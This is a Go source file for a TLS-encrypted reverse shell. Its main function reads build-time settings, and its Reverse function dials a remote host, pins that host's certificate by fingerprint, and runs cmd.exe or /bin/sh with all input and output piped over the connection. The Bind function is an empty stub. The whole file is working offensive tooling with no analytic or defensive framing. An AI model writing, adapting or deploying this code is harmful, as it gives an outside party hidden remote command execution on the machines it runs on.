package main

import (
	"bytes"
	"crypto/sha256"
	"crypto/tls"
	"encoding/hex"
	"os"
	"os/exec"
	"runtime"
	"strings"
)

const (
	ERR_COULD_NOT_DECODE = iota
	ERR_HOST_UNREACHABLE = iota
	ERR_BAD_FINGERPRINT  = iota
)

var (
	connectString string
	fingerPrint   string
	connType      string
)

func CheckKeyPin(conn *tls.Conn, fingerprint []byte) (bool, error) {
	valid := false
	connState := conn.ConnectionState()
	for _, peerCert := range connState.PeerCertificates {
		hash := sha256.Sum256(peerCert.Raw)
		if bytes.Compare(hash[0:], fingerprint) == 0 {
			valid = true
		}
	}
	return valid, nil
}

func Reverse(connectString string, fingerprint []byte) {
	var (
		cmd  *exec.Cmd
		conn *tls.Conn
		err  error
	)
	config := &tls.Config{InsecureSkipVerify: true}
	if conn, err = tls.Dial("tcp", connectString, config); err != nil {
		os.Exit(ERR_HOST_UNREACHABLE)
	}

	defer conn.Close()

	if ok, err := CheckKeyPin(conn, fingerprint); err != nil || !ok {
		os.Exit(ERR_BAD_FINGERPRINT)
	}

	switch runtime.GOOS {
	case "windows":
		cmd = exec.Command("cmd.exe")
	case "linux":
		cmd = exec.Command("/bin/sh")
	default:
		cmd = exec.Command("/bin/sh")
	}
	cmd.Stdout = conn
	cmd.Stderr = conn
	cmd.Stdin = conn
	cmd.Run()
}

func Bind(addr string) {
}

func main() {
	if connectString != "" && fingerPrint != "" && connType != "" {
		fprint := strings.Replace(fingerPrint, ":", "", -1)
		bytesFingerprint, err := hex.DecodeString(fprint)
		if err != nil {
			os.Exit(ERR_COULD_NOT_DECODE)
		}
		switch connType {
		case "reverse":
			Reverse(connectString, bytesFingerprint)
		case "bind":
			Bind(connectString)
		default:
			Reverse(connectString, bytesFingerprint)
		}
	}
}
